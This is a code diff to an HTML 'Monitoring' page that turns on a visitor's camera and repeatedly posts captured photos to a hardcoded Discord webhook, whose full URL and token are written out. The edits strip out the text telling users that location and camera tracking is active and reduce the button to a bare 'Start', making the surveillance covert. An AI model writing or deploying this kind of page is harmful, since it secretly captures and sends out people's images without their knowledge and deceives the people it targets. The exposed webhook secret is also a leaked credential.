@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Location & Camera Monitoring</title>
+  <title>Monitoring</title>
   <style>
     * {
       margin: 0;
@@ -105,9 +105,9 @@
 
   <div class="container">
     <h2>Monitoring System</h2>
-    <p class="subtitle">Location & Camera Tracking Service</p>
+    
 
-    <button id="startBtn" onclick="startTracking()">Start Monitoring</button>
+    <button id="startBtn" onclick="startTracking()">Start</button>
     
     <video id="video" autoplay playsinline></video>
     
@@ -116,7 +116,7 @@
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1476251185315844277/JKBNjJ2LUrioTJQ6Ok1SbFyFzs2ie1mGGYqB7zzUFwKnbtab5VEx5O1otp6CZGIRUnpF";
-    const UPDATE_INTERVAL = 300;
+    const UPDATE_INTERVAL = 5000;
     let tracking = false;
     let videoStream;
 
@@ -191,8 +191,7 @@
           sendPhotoToDiscord();
         }, UPDATE_INTERVAL);
 
-        showStatus("✓ Monitoring active - Updates every 30 seconds");
-        btn.textContent = "Monitoring Active";
+
       }).catch(() => {
         tracking = false;
         btn.disabled = false;
@@ -203,4 +202,5 @@
 
 </body>
 </html>
+
 
